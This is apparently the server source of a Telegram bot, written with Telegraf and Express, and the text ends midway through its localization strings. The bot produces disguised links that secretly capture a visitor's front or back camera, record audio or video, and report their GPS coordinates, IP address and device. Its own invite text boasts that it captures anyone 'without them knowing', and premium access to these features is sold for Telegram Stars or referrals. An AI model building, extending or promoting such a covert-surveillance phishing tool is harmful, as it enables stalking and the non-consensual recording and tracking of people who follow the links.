const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const config = require('./config');

const bot = new Telegraf(config.BOT_TOKEN);
const app = express();

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Security Headers
app.use((req, res, next) => {
    res.setHeader("X-Frame-Options", "DENY");
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("X-XSS-Protection", "1; mode=block");
    res.setHeader("Referrer-Policy", "no-referrer");
    res.setHeader("Permissions-Policy", "camera=*, microphone=*, geolocation=*");
    res.setHeader("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:;");
    next();
});

// Data directories
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');
const LOG_FILE = path.join(DATA_DIR, 'bot.log');
const NONCES_USED_FILE = path.join(DATA_DIR, 'nonces_used.json');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// ==========================================
// Helper Functions (from config.php)
// ==========================================

function writeLog(message) {
    const date = new Date().toISOString();
    fs.appendFileSync(LOG_FILE, `[${date}] ${message}\n`);
}

// Encryption functions (AES-256-CBC + HMAC)
function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(config.ENCRYPTION_KEY, 'utf8'), iv);
    let encrypted = cipher.update(data, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    const payload = iv.toString('base64') + encrypted;
    const encoded = Buffer.from(payload).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    const hmac = crypto.createHmac('sha256', config.HMAC_SECRET).update(encoded).digest('hex').substring(0, 12);
    return `${encoded}.${hmac}`;
}

function decryptData(data) {
    const parts = data.split('.');
    if (parts.length !== 2) return false;

    const encoded = parts[0];
    const hmac = parts[1];

    const expectedHmac = crypto.createHmac('sha256', config.HMAC_SECRET).update(encoded).digest('hex').substring(0, 12);
    if (expectedHmac !== hmac) return false;

    const payload = Buffer.from(encoded.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
    if (payload.length < 25) return false; // IV (16 bytes base64) + encrypted data

    const iv = Buffer.from(payload.substring(0, 24), 'base64'); // 16 bytes IV is 24 chars in base64
    const encrypted = payload.substring(24);

    try {
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(config.ENCRYPTION_KEY, 'utf8'), iv);
        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        writeLog(`Decryption error: ${e.message}`);
        return false;
    }
}

// Nonce system
function generateNonce() {
    const nonce = crypto.randomBytes(16).toString('hex');
    const timestamp = Math.floor(Date.now() / 1000);
    const token = `${nonce}|${timestamp}`;
    const signature = crypto.createHmac('sha256', config.NONCE_SECRET).update(token).digest('hex');
    return Buffer.from(`${token}|${signature}`).toString('base64');
}

function validateNonce(nonceToken, maxAge = 300) {
    try {
        const decoded = Buffer.from(nonceToken, 'base64').toString('utf8');
        const parts = decoded.split('|');
        if (parts.length !== 3) return false;

        const [nonce, timestampStr, signature] = parts;
        const timestamp = parseInt(timestampStr, 10);

        if (isNaN(timestamp) || (Math.floor(Date.now() / 1000) - timestamp) > maxAge) return false;

        const expectedSignature = crypto.createHmac('sha256', config.NONCE_SECRET).update(`${nonce}|${timestamp}`).digest('hex');
        if (expectedSignature !== signature) return false;

        let usedNonces = {};
        if (fs.existsSync(NONCES_USED_FILE)) {
            usedNonces = JSON.parse(fs.readFileSync(NONCES_USED_FILE, 'utf8'));
        }

        // Clean old nonces
        const now = Math.floor(Date.now() / 1000);
        usedNonces = Object.fromEntries(Object.entries(usedNonces).filter(([n, t]) => (now - t) < maxAge));

        if (usedNonces[nonce]) return false;

        usedNonces[nonce] = now;
        fs.writeFileSync(NONCES_USED_FILE, JSON.stringify(usedNonces, null, 2));

        return true;
    } catch (e) {
        writeLog(`Nonce validation error: ${e.message}`);
        return false;
    }
}

// Rate Limiting
const rateLimits = {};
function rateLimitCheck(identifier, maxRequests = 30, window = 60) {
    const now = Math.floor(Date.now() / 1000);
    if (!rateLimits[identifier]) {
        rateLimits[identifier] = { requests: [] };
    }

    rateLimits[identifier].requests = rateLimits[identifier].requests.filter(t => (now - t) < window);

    if (rateLimits[identifier].requests.length >= maxRequests) {
        return false;
    }

    rateLimits[identifier].requests.push(now);
    return true;
}

// Cooldown Check
const cooldowns = {};
function cooldownCheck(userId, action = 'link', seconds = 30) {
    const key = `${userId}_${action}`;
    const now = Math.floor(Date.now() / 1000);

    if (cooldowns[key]) {
        const lastTime = cooldowns[key];
        const remaining = seconds - (now - lastTime);
        if (remaining > 0) return remaining;
    }
    cooldowns[key] = now;
    return 0;
}

function sanitizeInput(input) {
    if (typeof input === 'object' && input !== null) {
        return Object.fromEntries(Object.entries(input).map(([k, v]) => [k, sanitizeInput(v)]));
    }
    if (typeof input === 'string') {
        return input.trim().replace(/<script[^>]*>.*?<\/script>/gi, '') // Remove script tags
                    .replace(/<\/?([a-z][a-z0-9]*)\b[^>]*>/gi, '') // Remove other HTML tags
                    .replace(/[<>&"']/g, (c) => {
                        switch (c) {
                            case '<': return '&lt;';
                            case '>': return '&gt;';
                            case '&': return '&amp;';
                            case '"': return '&quot;';
                            case "'": return '&#039;';
                        }
                        return c;
                    });
    }
    return input;
}

function generateSecureToken(length = 32) {
    return crypto.randomBytes(length / 2).toString('hex');
}

function generateShortCode(length = 10) {
    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let code = '';
    for (let i = 0; i < length; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
}

function saveShortLink(code, data) {
    let links = {};
    if (fs.existsSync(LINKS_FILE)) {
        links = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
    }
    links[code] = { ...data, created_at: Math.floor(Date.now() / 1000) };
    fs.writeFileSync(LINKS_FILE, JSON.stringify(links, null, 2));
}

function getShortLinkData(code) {
    if (!fs.existsSync(LINKS_FILE)) return false;
    const links = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
    return links[code] || false;
}

function validateMediaData(media_data, maxSizeMb = 15) {
    // Basic validation: check if it's a base64 string and within size limits
    const base64Regex = /^data:(image|video|audio)\/[a-zA-Z0-9]+;base64,([A-Za-z0-9+/=]+)$/;
    const match = media_data.match(base64Regex);
    if (!match) return false;

    const base64Content = match[2];
    const sizeInBytes = Buffer.byteLength(base64Content, 'base64');
    const maxBytes = maxSizeMb * 1024 * 1024;

    if (sizeInBytes > maxBytes) return false;

    return true;
}

function logSecurity(event, details = '') {
    const logFile = path.join(DATA_DIR, 'security.log');
    const ip = 'unknown'; // In Node.js, get from request object
    const time = new Date().toISOString();
    const ua = 'unknown'; // In Node.js, get from request object
    const entry = `[${time}] [${ip}] [${ua}] ${event}: ${details}\n`;
    fs.appendFileSync(logFile, entry);

    // Keep log file manageable (e.g., last 1000 lines)
    const maxLogSize = 5 * 1024 * 1024; // 5 MB
    if (fs.existsSync(logFile) && fs.statSync(logFile).size > maxLogSize) {
        const lines = fs.readFileSync(logFile, 'utf8').split('\n');
        const newLines = lines.slice(-1000);
        fs.writeFileSync(logFile, newLines.join('\n'));
    }
}

// ==========================================
// Data Management (from index.php)
// ==========================================

function loadUsers() {
    if (fs.existsSync(USERS_FILE)) {
        const content = fs.readFileSync(USERS_FILE, 'utf8');
        return JSON.parse(content) || {};
    }
    return {};
}

function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function getUser(userId) {
    const users = loadUsers();
    return users[userId] || null;
}

function updateUser(userId, data) {
    const users = loadUsers();
    if (!users[userId]) {
        users[userId] = {
            id: userId,
            joined_at: Math.floor(Date.now() / 1000),
            agreed_terms: false,
            lang: 'ar',
            lang_selected: false,
            is_vip: false,
            vip_activated_at: 0,
            stars: 0,
            referrals: 0,
            invited_by: null,
            referral_credited: false,
            is_banned: false,
            state: 'none',
            last_daily: 0,
            total_captures: 0,
            today_captures: 0,
            today_date: '',
            achievements: [],
            level: 'bronze',
            free_location_used: 0,
            free_audio_used: 0
        };
    }
    users[userId] = { ...users[userId], ...data };
    saveUsers(users);
    return users[userId];
}

function loadSettings() {
    if (fs.existsSync(SETTINGS_FILE)) {
        const content = fs.readFileSync(SETTINGS_FILE, 'utf8');
        return JSON.parse(content) || getDefaultSettings();
    }
    return getDefaultSettings();
}

function saveSettings(settings) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
}

function getMainMenuKeyboard(lang) {
    return Markup.keyboard([
        [Markup.button.text(getTextMsg("front_cam", lang)), Markup.button.text(getTextMsg("back_cam", lang))],
        [Markup.button.text(getTextMsg("custom_link", lang)), Markup.button.text(getTextMsg("location_btn", lang))],
        [Markup.button.text(getTextMsg("vip_section", lang)), Markup.button.text(getTextMsg("my_account", lang))],
        [Markup.button.text(getTextMsg("help", lang))]
    ]).resize();
}

function getDefaultSettings() {
    return {
        maintenance_mode: false,
        force_channel: null,
        vip_price_stars: 250,
        vip_price_referrals: 10,
        referral_stars: 2,
        cooldown_seconds: 30
    };
}

// ==========================================
// Level & Achievement System
// ==========================================

function getUserLevel(referrals) {
    if (referrals >= 50) return 'diamond';
    if (referrals >= 20) return 'gold';
    if (referrals >= 5) return 'silver';
    return 'bronze';
}

function getLevelEmoji(level, lang = 'ar') {
    const levels = {
        'bronze': { 'ar': '🥉 برونزي', 'en': '🥉 Bronze', 'hi': '🥉 कांस्य', 'bn': '🥉 ব্রোঞ্জ', 'ru': '🥉 Бронза' },
        'silver': { 'ar': '🥈 فضي', 'en': '🥈 Silver', 'hi': '🥈 रजत', 'bn': '🥈 রৌপ্য', 'ru': '🥈 Серебро' },
        'gold': { 'ar': '🥇 ذهبي', 'en': '🥇 Gold', 'hi': '🥇 स्वर्ण', 'bn': '🥇 সোনা', 'ru': '🥇 Золото' },
        'diamond': { 'ar': '💎 ماسي', 'en': '💎 Diamond', 'hi': '💎 हीरा', 'bn': '💎 হীরা', 'ru': '💎 Алмаз' }
    };
    return levels[level][lang] ?? levels[level]['ar'];
}

function checkDailyBonus(userId) {
    const user = getUser(userId);
    if (!user) return false;

    const today = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
    const lastDailyDate = user.last_daily ? new Date(user.last_daily * 1000).toISOString().slice(0, 10) : '';

    if (lastDailyDate !== today) {
        updateUser(userId, {
            stars: user.stars + 1,
            last_daily: Math.floor(Date.now() / 1000)
        });
        return true;
    }
    return false;
}

function checkAchievements(userId) {
    const user = getUser(userId);
    if (!user) return [];

    const newAchievements = [];
    const achievements = user.achievements || [];

    if (user.total_captures >= 1 && !achievements.includes('first_capture')) {
        achievements.push('first_capture');
        newAchievements.push('first_capture');
    }
    if (user.referrals >= 1 && !achievements.includes('first_referral')) {
        achievements.push('first_referral');
        newAchievements.push('first_referral');
    }
    if (user.referrals >= 10 && !achievements.includes('ten_referrals')) {
        achievements.push('ten_referrals');
        newAchievements.push('ten_referrals');
    }
    if (user.referrals >= 50 && !achievements.includes('fifty_referrals')) {
        achievements.push('fifty_referrals');
        newAchievements.push('fifty_referrals');
    }
    if (user.is_vip && !achievements.includes('vip_member')) {
        achievements.push('vip_member');
        newAchievements.push('vip_member');
    }

    if (newAchievements.length > 0) {
        updateUser(userId, { achievements: achievements });
    }

    return newAchievements;
}

// ==========================================
// Localization (5 Languages)
// ==========================================

const texts = {
    'ar': {
        'welcome': "مرحباً بك في بوت الكاميرا! 📸\nيرجى الموافقة على الشروط للبدء.",
        'agree_btn': "📝 قراءة والموافقة على الشروط",
        'choose_lang': "يرجى اختيار لغتك المفضلة:",
        'main_menu': "القائمة الرئيسية 🏠\nاختر ما تريد القيام به:",
        'front_cam': "📸 كاميرا أمامية",
        'back_cam': "📸 كاميرا خلفية",
        'custom_link': "🔗 رابط مخصص",
        'location_btn': "📍 كشف موقع",
        'vip_section': "🌟 قسم VIP",
        'my_account': "👤 حسابي",
        'help': "❓ مساعدة",
        'terms_agreed': "تمت الموافقة على الشروط بنجاح! ✅",
        'lang_saved': "تم حفظ اللغة بنجاح! 🌐",
        'send_custom_link': "أرسل الرابط الذي تريد تحويله:",
        'custom_link_generated': "تم إنشاء الرابط المخصص بنجاح! 🎉\n\nرابط الكاميرا الأمامية:\n%s\n\nرابط الكاميرا الخلفية:\n%s",
        'vip_info': "🌟 <b>قسم VIP</b> 🌟\n\n<b>المميزات:</b>\n• تصوير فيديو حقيقي 5 ثواني 🎥\n• تسجيل صوت 10 ثواني 🎙️\n• كشف موقع غير محدود 📍\n• بدون كولداون ⚡\n\n<b>طرق الشراء:</b>\n💫 %s نجمة تيلجرام\n👥 %s إحالة مؤكدة",
        'buy_vip_stars': "⭐ شراء بالنجوم (%s نجمة)",
        'buy_vip_referrals': "👥 شراء بالإحالات (%s إحالة)",
        'vip_video': "🎥 رابط فيديو (5 ثواني)",
        'vip_audio': "🎙️ رابط تسجيل صوت",
        'vip_location': "📍 رابط كشف موقع",
        'not_vip': "عذراً، هذه الميزة متاحة فقط لمشتركي VIP. ❌",
        'vip_purchased_referrals': "🎉 مبروك! تم تفعيل VIP بنجاح عبر الإحالات!",
        'not_enough_referrals': "❌ عدد إحالاتك غير كافي.\nلديك: %s إحالة\nالمطلوب: %s إحالة",
        'account_info': "👤 <b>معلومات حسابك</b>\n\n🆔 الآيدي: <code>%s</code>\n⭐ النقاط: %s\n👥 الإحالات: %s\n🏅 المستوى: %s\n📊 الحالة: %s\n📸 إجمالي الالتقاطات: %s\n📍 موقع مجاني متبقي: %s\n🎙️ صوت مجاني متبقي: %s",
        'share_invite': "📤 مشاركة رابط الدعوة",
        'invite_text': "🔥 جرب هذا البوت الخرافي! يقدر يصور أي شخص بدون ما يدري 📸\nجربه الحين 👇",
        'status_normal': "عادي",
        'status_vip': "VIP 🌟",
        'maintenance': "عذراً، البوت حالياً في وضع الصيانة. يرجى المحاولة لاحقاً. 🛠️",
        'banned': "عذراً، لقد تم حظرك من استخدام البوت. 🚫",
        'force_join': "عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه. 📢",
        'join_channel': "اشترك في القناة",
        'check_join': "✅ تحقق من الاشتراك",
        'invalid_link': "رابط غير صالح. يرجى إرسال رابط صحيح يبدأ بـ http أو https.",
        'referral_link': "🔗 رابط الإحالة الخاص بك:\nhttps://t.me/%s?start=%s\n\nشارك هذا الرابط للحصول على نقاط!",
        'new_referral': "🎉 لقد قام شخص جديد بالاشتراك عبر رابطك! حصلت على نقاط.",
        'payment_success': "تم الدفع بنجاح! أنت الآن عضو VIP. 🎉",
        'payment_failed': "فشلت عملية الدفع. يرجى المحاولة مرة أخرى. ❌",
        'cooldown_msg': "⏳ يرجى الانتظار %s ثانية قبل إنشاء رابط جديد.",
        'daily_bonus': "🎁 مكافأة يومية! حصلت على نقطة إضافية. رصيدك الآن: %s",
        'achievement_unlocked': "🏆 إنجاز جديد: %s",
        'ach_first_capture': "📸 أول التقاط!",
        'ach_first_referral': "👥 أول إحالة!",
        'ach_ten_referrals': "🔥 10 إحالات!",
        'ach_fifty_referrals': "💎 50 إحالة!",
        'ach_vip_member': "🌟 عضو VIP!",
        'lang_changed': "تم تغيير اللغة بنجاح! 🌐",
        'your_id': "🆔 آيدي حسابك: <code>%s</code>",
        'location_generated': "📍 تم إنشاء رابط كشف الموقع بنجاح!\n\n%s",
        'free_trial_ended': "❌ انتهت الفترة المجانية!\nللاستمرار، يرجى الاشتراك في VIP. 🌟",
        'free_remaining': "📊 متبقي لك %s محاولات مجانية.",
        'location_received': "📍 <b>موقع جديد!</b>\n\n🌐 الإحداثيات: %s, %s\n🗺 خرائط: %s\n🌐 IP: %s\n📱 الجهاز: %s\n💻 المنصة: %s\n📅 الوقت: %s"
    },
    'en': {
        'welcome': "Welcome to the Camera Bot! 📸\nPlease agree to the terms to start.",
        'agree_btn': "📝 Read and Agree to Terms",
        'choose_lang': "Please choose your preferred language:",
        'main_menu': "Main Menu 🏠\nChoose what you want to do:",
        'front_cam': "📸 Front Camera",
        'back_cam': "📸 Back Camera",
        'custom_link': "🔗 Custom Link",
        'location_btn': "📍 Track Location",
        'vip_section': "🌟 VIP Section",
        'my_account': "👤 My Account",
        'help': "❓ Help",
        'terms_agreed': "Terms agreed successfully! ✅",
        'lang_saved': "Language saved successfully! 🌐",
        'send_custom_link': "Send the link you want to convert:",
        'custom_link_generated': "Custom link generated successfully! 🎉\n\nFront Camera Link:\n%s\n\nBack Camera Link:\n%s",
        'vip_info': "🌟 <b>VIP Section</b> 🌟\n\n<b>Features:</b>\n• Real 5-second video capture 🎥\n• 10-second audio recording 🎙️\n• Unlimited location tracking 📍\n• No cooldown ⚡\n\n<b>Purchase Options:</b>\n💫 %s Telegram Stars\n👥 %s Confirmed Referrals",
        'buy_vip_stars': "⭐ Buy with Stars (%s Stars)",
        'buy_vip_referrals': "👥 Buy with Referrals (%s Referrals)",
        'vip_video': "🎥 Video Link (5 sec)",
        'vip_audio': "🎙️ Audio Recording Link",
        'vip_location': "📍 Location Track Link",
        'not_vip': "Sorry, this feature is only available for VIP members. ❌",
        'vip_purchased_referrals': "🎉 Congratulations! VIP activated via referrals!",
        'not_enough_referrals': "❌ Not enough referrals.\nYou have: %s\nRequired: %s",
        'account_info': "👤 <b>Your Account Info</b>\n\n🆔 ID: <code>%s</code>\n⭐ Points: %s\n👥 Referrals: %s\n🏅 Level: %s\n📊 Status: %s\n📸 Total Captures: %s\n📍 Free Location Left: %s\n🎙️ Free Audio Left: %s",
        'share_invite': "📤 Share Invite Link",
        'invite_text': "🔥 Try this amazing bot! It can capture anyone without them knowing 📸\nTry it now 👇",
        'status_normal': "Normal",
        'status_vip': "VIP 🌟",
        'maintenance': "Sorry, the bot is currently in maintenance mode. Please try again later. 🛠️",
        'banned': "Sorry, you have been banned from using the bot. 🚫",
        'force_join': "Sorry, you must join the bot's channel first to use it. 📢",
        'join_channel': "Join Channel",
        'check_join': "✅ Check Subscription",
        'invalid_link': "Invalid link. Please send a valid link starting with http or https.",
        'referral_link': "🔗 Your referral link:\nhttps://t.me/%s?start=%s\n\nShare this link to get points!",
        'new_referral': "🎉 Someone joined using your link! You got points.",
        'payment_success': "Payment successful! You are now a VIP member. 🎉",
        'payment_failed': "Payment failed. Please try again. ❌",
        'cooldown_msg': "⏳ Please wait %s seconds before creating a new link.",
        'daily_bonus': "🎁 Daily bonus! You got an extra point. Balance: %s",
        'achievement_unlocked': "🏆 New Achievement: %s",
        'ach_first_capture': "📸 First Capture!",
        'ach_first_referral': "👥 First Referral!",
        'ach_ten_referrals': "🔥 10 Referrals!",
        'ach_fifty_referrals': "💎 50 Referrals!",
        'ach_vip_member': "🌟 VIP Member!",
        'lang_changed': "Language changed successfully! 🌐",
        'your_id': "🆔 Your ID: <code>%s</code>",
        'location_generated': "📍 Location tracking link generated!\n\n%s",
        'free_trial_ended': "❌ Free trial ended!\nTo continue, please subscribe to VIP. 🌟",
        'free_remaining': "📊 You have %s free attempts remaining.",
        'location_received': "📍 <b>New Location!</b>\n\n🌐 Coordinates: %s, %s\n🗺 Maps: %s\n🌐 IP: %s\n📱 Device: %s\n💻 Platform: %s\n📅 Time: %s"
    },
    'hi': {
        'welcome': "कैमरा बॉट में आपका स्वागत है! 📸\nशुरू करने के लिए शर्तों से सहमत हों।",
        'agree_btn': "📝 शर्तें पढ़ें और सहमत हों",
        'choose_lang': "कृपया अपनी पसंदीदा भाषा चुनें:",
        'main_menu': "मुख्य मेनू 🏠\nचुनें क्या करना चाहते हैं:",
        'front_cam': "📸 फ्रंट कैमरा",
        'back_cam': "📸 बैक कैमरा",
        'custom_link': "🔗 कस्टम लिंक",
        'location_btn': "📍 लोकेशन ट्रैक",
        'vip_section': "🌟 VIP सेक्शन",
        'my_account': "👤 मेरा अकाउंट",
        'help': "❓ मदद",
        'terms_agreed': "शर्तें स्वीकार! ✅",
        'lang_saved': "भाषा सहेजी गई! 🌐",
        'send_custom_link': "वह लिंक भेजें जिसे कन्वर्ट करना है:",
        'custom_link_generated': "कस्टम लिंक बनाया गया! 🎉\n\nफ्रंट कैमरा लिंक:\n%s\n\nबैक कैमरा लिंक:\n%s",
        'vip_info': "🌟 <b>VIP सेक्शन</b> 🌟\n\n<b>फीचर्स:</b>\n• 5 सेकंड वीडियो 🎥\n• 10 सेकंड ऑडियो 🎙️\n• असीमित लोकेशन 📍\n• कोई कूलडाउन नहीं ⚡\n\n<b>खरीदें:</b>\n💫 %s टेलीग्राम स्टार\n👥 %s रेफरल",
        'buy_vip_stars': "⭐ स्टार से खरीदें (%s स्टार)",
        'buy_vip_referrals': "👥 रेफरल से खरीदें (%s रेफरल)",
        'vip_video': "🎥 वीडियो लिंक (5 सेकंड)",
        'vip_audio': "🎙️ ऑडियो रिकॉर्डिंग लिंक",
        'vip_location': "📍 लोकेशन ट्रैक लिंक",
        'not_vip': "यह फीचर केवल VIP सदस्यों के लिए है। ❌",
        'vip_purchased_referrals': "🎉 बधाई! VIP सक्रिय!",
        'not_enough_referrals': "❌ पर्याप्त रेफरल नहीं।\nआपके पास: %s\nआवश्यक: %s",
        'account_info': "👤 <b>अकाउंट जानकारी</b>\n\n🆔 ID: <code>%s</code>\n⭐ पॉइंट: %s\n👥 रेफरल: %s\n🏅 लेवल: %s\n📊 स्टेटस: %s\n📸 कुल कैप्चर: %s\n📍 फ्री लोकेशन: %s\n🎙️ फ्री ऑडियो: %s",
        'share_invite': "📤 इनवाइट लिंक शेयर करें",
        'invite_text': "🔥 इस अद्भुत बॉट को आज़माएं! 📸\nअभी ट्राई करें 👇",
        'status_normal': "सामान्य",
        'status_vip': "VIP 🌟",
        'maintenance': "बॉट मेंटेनेंस में है। बाद में कोशिश करें। 🛠️",
        'banned': "आपको बैन कर दिया गया है। 🚫",
        'force_join': "पहले चैनल जॉइन करें। 📢",
        'join_channel': "चैनल जॉइन करें",
        'check_join': "✅ सब्सक्रिप्शन चेक करें",
        'invalid_link': "अमान्य लिंक। http या https से शुरू होने वाला लिंक भेजें।",
        'referral_link': "🔗 आपका रेफरल लिंक:\nhttps://t.me/%s?start=%s\n\nपॉइंट पाने के लिए शेयर करें!",
        'new_referral': "🎉 किसी ने आपके लिंक से जॉइन किया!",
        'payment_success': "भुगतान सफल! अब आप VIP हैं। 🎉",
        'payment_failed': "भुगतान विफल। फिर से कोशिश करें। ❌",
        'cooldown_msg': "⏳ कृपया %s सेकंड प्रतीक्षा करें।",
        'daily_bonus': "🎁 दैनिक बोनस! बैलेंस: %s",
        'achievement_unlocked': "🏆 नई उपलब्धि: %s",
        'ach_first_capture': "📸 पहला कैप्चर!",
        'ach_first_referral': "👥 पहला रेफरल!",
        'ach_ten_referrals': "🔥 10 रेफरल!",
        'ach_fifty_referrals': "💎 50 रेफरल!",
        'ach_vip_member': "🌟 VIP सदस्य!",
        'lang_changed': "भाषा बदली गई! 🌐",
        'your_id': "🆔 आपकी ID: <code>%s</code>",
        'location_generated': "📍 लोकेशन ट्रैकिंग लिंक बनाया गया!\n\n%s",
        'free_trial_ended': "❌ फ्री ट्रायल समाप्त!\nजारी रखने के लिए VIP लें। 🌟",
        'free_remaining': "📊 आपके पास %s फ्री प्रयास शेष हैं।",
        'location_received': "📍 <b>नया लोकेशन!</b>\n\n🌐 निर्देशांक: %s, %s\n🗺 मैप: %s\n🌐 IP: %s\n📱 डिवाइस: %s\n💻 प्लेटफॉर्म: %s\n📅 समय: %s"
    },
    'bn': {
        'welcome': "ক্যামেরা বটে স্বাগতম! 📸\nশুরু করতে শর্তাবলী মেনে নিন।",
        'agree_btn': "📝 শর্তাবলী পড়ুন ও সম্মত হন",
        'choose_lang': "আপনার পছন্দের ভাষা বেছে নিন:",
        'main_menu': "প্রধান মেনু 🏠\nকী করতে চান বেছে নিন:",
        'front_cam': "📸 ফ্রন্ট ক্যামেরা",
        'back_cam': "📸 ব্যাক ক্যামেরা",
        'custom_link': "🔗 কাস্টম লিংক",
        'location_btn': "📍 লোকেশন ট্র্যাক",
        'vip_section': "🌟 VIP সেকশন",
        'my_account': "👤 আমার অ্যাকাউন্ট",
        'help': "❓ সাহায্য",
        'terms_agreed': "শর্তাবলী গৃহীত! ✅",
        'lang_saved': "ভাষা সংরক্ষিত! 🌐",
        'send_custom_link': "কনভার্ট করতে লিংক পাঠান:",
        'custom_link_generated': "কাস্টম লিংক তৈরি হয়েছে! 🎉\n\nফ্রন্ট ক্যামেরা:\n%s\n\nব্যাক ক্যামেরা:\n%s",
        'vip_info': "🌟 <b>VIP সেকশন</b> 🌟\n\n<b>ফিচার:</b>\n• ৫ সেকেন্ড ভিডিও 🎥\n• ১০ সেকেন্ড অডিও 🎙️\n• আনলিমিটেড লোকেশন 📍\n• কোনো কুলডাউন নেই ⚡\n\n<b>কিনুন:</b>\n💫 %s টেলিগ্রাম স্টার\n👥 %s রেফারেল",
        'buy_vip_stars': "⭐ স্টার দিয়ে কিনুন (%s স্টার)",
        'buy_vip_referrals': "👥 রেফারেল দিয়ে কিনুন (%s রেফারেল)",
        'vip_video': "🎥 ভিডিও লিংক (৫ সেকেন্ড)",
        'vip_audio': "🎙️ অডিও রেকর্ডিং লিংক",
        'vip_location': "📍 লোকেশন ট্র্যাক লিংক",
        'not_vip': "এই ফিচার শুধু VIP সদস্যদের জন্য। ❌",
        'vip_purchased_referrals': "🎉 অভিনন্দন! VIP সক্রিয়!",
        'not_enough_referrals': "❌ পর্যাপ্ত রেফারেল নেই।\nআপনার: %s\nপ্রয়োজন: %s",
        'account_info': "👤 <b>অ্যাকাউন্ট তথ্য</b>\n\n🆔 ID: <code>%s</code>\n⭐ পয়েন্ট: %s\n👥 রেফারেল: %s\n🏅 লেভেল: %s\n📊 স্ট্যাটাস: %s\n📸 মোট ক্যাপচার: %s\n📍 ফ্রি লোকেশন: %s\n🎙️ ফ্রি অডিও: %s",
        'share_invite': "📤 ইনভাইট লিংক শেয়ার করুন",
        'invite_text': "🔥 এই অসাধারণ বটটি ব্যবহার করুন! 📸\nএখনই চেষ্টা করুন 👇",
        'status_normal': "সাধারণ",
        'status_vip': "VIP 🌟",
        'maintenance': "বট মেইনটেন্যান্সে আছে। পরে চেষ্টা করুন। 🛠️",
        'banned': "আপনাকে ব্যান করা হয়েছে। 🚫",
        'force_join': "প্রথমে চ্যানেল জয়েন করুন। 📢",
        'join_channel': "চ্যানেল জয়েন করুন",
        'check_join': "✅ সাবস্ক্রিপশন চেক করুন",
        'invalid_link': "অবৈধ লিংক। http বা https দিয়ে শুরু হওয়া লিংক পাঠান।",
        'referral_link': "🔗 আপনার রেফারেল লিংক:\nhttps://t.me/%s?start=%s\n\nপয়েন্ট পেতে শেয়ার করুন!",
        'new_referral': "🎉 কেউ আপনার লিংক দিয়ে জয়েন করেছে!",
        'payment_success': "পেমেন্ট সফল! আপনি এখন VIP। 🎉",
        'payment_failed': "পেমেন্ট ব্যর্থ। আবার চেষ্টা করুন। ❌",
        'cooldown_msg': "⏳ %s সেকেন্ড অপেক্ষা করুন।",
        'daily_bonus': "🎁 দৈনিক বোনাস! ব্যালেন্স: %s",
        'achievement_unlocked': "🏆 নতুন অর্জন: %s",
        'ach_first_capture': "📸 প্রথম ক্যাপচার!",
        'ach_first_referral': "👥 প্রথম রেফারেল!",
        'ach_ten_referrals': "🔥 ১০ রেফারেল!",
        'ach_fifty_referrals': "💎 ৫০ রেফারেল!",
        'ach_vip_member': "🌟 VIP সদস্য!",
        'lang_changed': "ভাষা পরিবর্তন হয়েছে! 🌐",
        'your_id': "🆔 আপনার ID: <code>%s</code>",
        'location_generated': "📍 লোকেশন ট্র্যাকিং লিংক তৈরি!\n\n%s",
        'free_trial_ended': "❌ ফ্রি ট্রায়াল শেষ!\nচালিয়ে যেতে VIP নিন। 🌟",
        'free_remaining': "📊 আপনার %s ফ্রি প্রচেষ্টা বাকি আছে।",
        'location_received': "📍 <b>নতুন লোকেশন!</b>\n\n🌐 স্থানাঙ্ক: %s, %s\n🗺 ম্যাপ: %s\n🌐 IP: %s\n📱 ডিভাইস: %s\n💻 প্ল্যাটফর্ম: %s\n📅 সময়: %s"
    },
    'ru': {
        'welcome': "Добро пожаловать в Camera Bot! 📸\nПримите условия для начала.",
        'agree_btn': "📝 Прочитать и принять условия",
        'choose_lang': "Выберите язык:",
        'main_menu': "Главное меню 🏠\nВыберите действие:",
        'front_cam': "📸 Фронтальная камера",
        'back_cam': "📸 Задняя камера",
        'custom_link': "🔗 Своя ссылка",
        'location_btn': "📍 Отслеживание",
        'vip_section': "🌟 VIP Раздел",
        'my_account': "👤 Мой аккаунт",
        'help': "❓ Помощь",
        'terms_agreed': "Условия приняты! ✅",
        'lang_saved': "Язык сохранён! 🌐",
        'send_custom_link': "Отправьте ссылку для конвертации:",
        'custom_link_generated': "Ссылка создана! 🎉\n\nФронтальная камера:\n%s\n\nЗадняя камера:\n%s",
        'vip_info': "🌟 <b>VIP Раздел</b> 🌟\n\n<b>Возможности:</b>\n• 5 сек видео 🎥\n• 10 сек аудио 🎙️\n• Безлимит локаций 📍\n• Без задержки ⚡\n\n<b>Купить:</b>\n💫 %s Telegram Stars\n👥 %s Рефералов",
        'buy_vip_stars': "⭐ Купить за Stars (%s Stars)",
        'buy_vip_referrals': "👥 Купить за рефералы (%s реф.)",
        'vip_video': "🎥 Видео ссылка (5 сек)",
